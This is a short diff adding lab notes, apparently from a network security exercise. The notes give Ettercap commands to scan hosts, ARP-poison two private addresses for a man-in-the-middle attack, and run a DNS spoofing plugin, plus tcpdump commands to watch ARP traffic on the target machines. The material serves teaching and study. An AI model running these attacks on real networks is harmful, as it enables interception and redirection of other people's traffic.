@@ -1,0 +1,15 @@
+# Ettercap 
+# On attacker machine
+# Scan for host
+ettercap --text --iface eth0 --nosslmitm --nopromisc --quiet
+# MitM attack
+ettercap --text --iface eth0 --nosslmitm --nopromisc --only-mitm --mitm arp /10.1.2.2/// /10.1.2.3///
+
+# On cache machine
+tcpdump -nn -i eth1 arp
+
+# On auth machine
+tcpdump -nn -i eth0 arp
+
+# Dns spoof attack
+ettercap --text --iface eth0 --nosslmitm --nopromisc --plugin dns_spoof --mitm arp /10.1.2.2/// /10.1.2.3///
